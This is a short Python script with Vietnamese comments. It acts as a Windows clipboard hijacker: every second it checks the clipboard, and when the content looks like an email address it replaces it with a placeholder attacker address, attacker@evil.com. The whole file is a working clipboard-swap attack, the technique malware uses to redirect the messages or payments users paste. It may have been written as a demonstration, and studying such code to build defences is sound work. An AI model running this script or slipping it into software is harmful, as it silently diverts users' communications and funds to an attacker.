import win32clipboard
import re
from time import sleep

attacker_email = "attacker@evil.com" #email thay thế 
emailregex = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$' #biểu thức chính quy hợp lệ bằng mã regex 

print("[+] Đang giám sát clipboard. Nhấn Ctrl+C để dừng.")

try:
    while True:
        win32clipboard.OpenClipboard() # mở clipboard 
        try:
            data = win32clipboard.GetClipboardData().strip()  #Lấy dữ liệu từ clipboard và loại bỏ khoảng trắng
            if re.search(emailregex, data.lower()): # Kiểm tra nếu dữ liệu là email hợp lệ
                print(f"[!] Phát hiện email: {data} → Thay thế bằng {attacker_email}")
                win32clipboard.EmptyClipboard()# Xóa dữ liệu trong clipboard
                win32clipboard.SetClipboardText(attacker_email)  # Thay thế email bằng email của attacker
        except:
            pass  # Nếu clipboard không chứa text, bỏ qua
        finally:
            win32clipboard.CloseClipboard() # Đóng clipboard
        sleep(1)  # Chờ 1 giây trước khi kiểm tra lại
except KeyboardInterrupt:
    print("\n[+] Script đã dừng.")
